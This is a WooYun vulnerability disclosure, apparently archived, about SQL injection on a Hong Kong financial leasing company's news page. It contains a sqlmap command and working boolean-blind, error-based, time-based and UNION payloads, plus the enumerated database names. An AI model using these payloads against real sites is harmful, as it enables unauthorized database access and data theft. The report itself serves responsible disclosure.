wybug_title: 中國金融租賃集團主站另一处SQL注入（香港地區）

wybug_detail: 漏洞详情 披露状态：   									2016-01-08：	细节已通知厂商并且等待厂商处理中									2016-01-11：	厂商已经确认，细节仅向厂商公开									2016-01-21：	细节向核心白帽子及相关领域专家公开									2016-01-31：	细节向普通白帽子公开									2016-02-10：	细节向实习白帽子公开									2016-02-22：	细节向公众公开  简要描述： 如题 详细说明：  1,url:sqlmap -u "http://**.**.**.**/c/corp_news_details.php?itemid=457&page=01" --batch2,注入信息---Parameter: itemid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: itemid=457 AND 6830=6830&page=01    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: itemid=457 AND (SELECT 9373 FROM(SELECT COUNT(*),CONCAT(0x7162786b71,(SELECT (ELT(9373=9373,1))),0x71706b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&page=01    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: itemid=457 AND (SELECT * FROM (SELECT(SLEEP(5)))RQbq)&page=01    Type: UNION query    Title: Generic UNION query (NULL) - 5 columns    Payload: itemid=457 UNION ALL SELECT NULL,NULL,CONCAT(0x7162786b71,0x47696847734d69447654,0x71706b6271),NULL,NULL-- &page=01---3,数据库web application technology: PHP 5.3.29, Apache 2back-end DBMS: MySQL 5.0[08:15:45] [INFO] fetching database names[08:15:45] [WARNING] reflective value(s) found and filtering outavailable databases [3]:[*] cflgcomhk_data[*] information_schema[*] testOK   漏洞证明：  Fix   修复方案：  Fix   版权声明：转载请注明来源 逆流冰河@乌云
